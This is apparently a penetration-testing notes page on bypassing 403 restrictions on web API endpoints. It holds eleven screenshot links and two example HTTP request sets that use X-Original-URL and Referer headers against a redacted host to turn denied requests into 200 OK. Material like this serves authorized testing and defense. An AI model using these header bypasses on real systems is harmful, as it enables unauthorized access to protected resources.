

### Bypassing Endpoints — 01
![image](https://user-images.githubusercontent.com/37910997/154128013-9ec18efa-c35a-4cdb-a09e-7c4eeb954af0.png)

### Bypassing Endpoints — 02
![image](https://user-images.githubusercontent.com/37910997/154128074-f9740c31-1804-4c7e-b6e3-31cc18544219.png)

### Bypassing Endpoints — 03
![image](https://user-images.githubusercontent.com/37910997/154128145-66d20c3f-8dac-4244-825c-c1f6981f9b77.png)

### Bypassing Endpoints — 04
![image](https://user-images.githubusercontent.com/37910997/154128178-c28622dd-00c7-40e5-bfb1-9c4050051910.png)

### Bypassing Endpoints — 05
![image](https://user-images.githubusercontent.com/37910997/154128318-28af207d-6c9c-4e95-b5ce-21bc2a7f8bdc.png)


### Bypassing Endpoints — 06
![image](https://user-images.githubusercontent.com/37910997/154128331-8843d0e8-ebe4-4c23-b6a1-f1c648380c6f.png)


### Bypassing Endpoints — 07
![image](https://user-images.githubusercontent.com/37910997/154128347-8f5bc509-5632-4f15-b878-82fb1469bf41.png)


### Bypassing Endpoints — 08
![image](https://user-images.githubusercontent.com/37910997/154128359-3d69744e-dd50-47f0-9fd6-a51f70eef10e.png)


### Bypassing Endpoints — 09
![image](https://user-images.githubusercontent.com/37910997/154128373-d37c39e5-f90f-4667-a4c4-14ff9336810b.png)


### Bypassing Endpoints — 10
![image](https://user-images.githubusercontent.com/37910997/154128382-f06b6671-a3e1-421c-9a5a-e3452ad76cf4.png)


### Bypassing Endpoints — 11
![image](https://user-images.githubusercontent.com/37910997/154128397-3640e8a3-0c0b-4ce7-8f3a-a41f4111176f.png)


## Http Header based bypass:

- 1. X-Original-URL: /redact

### Example:

```
GET /api/getUser HTTP/1.1 → 403
Host: redact.com

GET /HTTP/1.1
Host: redact.com
X-Original-URL: /api/getUser → 200 OK
```


- 2. Referer: https://site.com/api/redact

### Example:

```
GET /api/getUser HTTP/1.1 → access denied
Host: redact.com

GET / HTTP/1.1
Host: redact.com
Referer: https://site.com/api/getUser → 200 OK

GET /api/getUser HTTP/1.1
Host: redact.com
Referer: https://site.com/api/getUser → 200 OK
```
